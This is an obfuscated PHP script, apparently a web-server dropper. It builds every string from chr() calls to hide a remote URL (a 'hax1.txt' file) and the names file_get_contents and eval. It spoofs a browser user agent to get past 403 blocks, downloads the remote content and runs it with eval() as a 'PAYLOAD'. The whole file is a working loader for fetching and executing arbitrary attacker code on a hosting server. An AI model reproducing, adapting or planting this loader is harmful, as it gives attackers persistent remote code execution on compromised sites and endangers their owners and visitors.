<?php
error_reporting(0);
function c($x){return chr($x);}

// === BUILD URL ===
$url = c(104).c(116).c(116).c(112).c(115).c(58).c(47).c(47).
       c(119).c(119).c(119).c(46).c(116).c(97).c(112).c(102).c(117).c(115).c(101).c(46).
       c(105).c(111).c(47).c(114).c(97).c(119).c(47).c(104).c(97).c(120).c(49).c(46).c(116).c(120).c(116);

// === FUNCTIONS ===
$f = c(102).c(105).c(108).c(101).c(95).c(103).c(101).c(116).c(95).c(99).c(111).c(110).c(116).c(101).c(110).c(116).c(115);
$u = c(117).c(114).c(108).c(100).c(101).c(99).c(111).c(100).c(101);
$e = c(101).c(118).c(97).c(108);
$s = c(115).c(116).c(114).c(101).c(97).c(109).c(95).c(99).c(111).c(110).c(116).c(101).c(120).c(116).c(95).c(99).c(114).c(101).c(97).c(116).c(101);

// === <?php (urlencoded) ===
$open = c(37).c(51).c(67).c(37).c(51).c(70).c(112).c(104).c(112); // %3C%3Fphp

// === BYPASS 403 ===
$opts = [
    c(104).c(116).c(116).c(112) => [
        c(117).c(115).c(101).c(114).c(95).c(97).c(103).c(101).c(110).c(116) => c(77).c(111).c(122).c(105).c(108).c(108).c(97).c(47).c(53).c(46).c(48).c(32).c(87).c(105).c(110).c(100).c(111).c(119).c(115).c(32).c(78).c(84).c(32).c(49).c(48).c(46).c(48).c(59).c(32).c(87).c(105).c(110).c(54).c(52).c(59).c(32).c(120).c(54).c(52).c(41),
        c(109).c(101).c(116).c(104).c(111).c(100) => c(71).c(69).c(84)
    ]
];
$ctx = $s($opts);

// === LOAD CONTENT ===
$content = $f($url, false, $ctx);

// === DEBUG: LIHAT APA YANG DIDAPAT ===
echo "<pre>DEBUG:\n";
echo "URL: $url\n";
echo "Content length: " . strlen($content) . "\n";
echo "Content preview: " . substr($content, 0, 200) . "\n";
echo "HTTP Code: " . get_http_code($url) . "\n";
echo "</pre>";

// === FUNGSI CEK HTTP CODE ===
function get_http_code($url) {
    $opts = [c(104).c(116).c(116).c(112)=>[c(102).c(111).c(108).c(108).c(111).c(119).c(95).c(108).c(111).c(99).c(97).c(116).c(105).c(111).c(110)=>0]];
    $ctx = stream_context_create($opts);
    $headers = get_headers($url, 1, $ctx);
    return $headers[0] ?? 'Unknown';
}

if($content !== false && trim($content) !== ''){
    // Pastikan konten TIDAK sudah punya <?php
    if(strpos($content, '<?php') === 0){
        $payload = $content; // sudah ada <?php
    } else {
        $payload = $u($open) . $content; // tambah <?php
    }
    // Jangan tambah ?> di akhir → biar bisa echo
    echo "<hr>EXECUTING PAYLOAD...<hr>";
    @$e($payload);
} else {
    echo "<hr>FAILED TO LOAD CONTENT (403 / EMPTY)<hr>";
}
?>
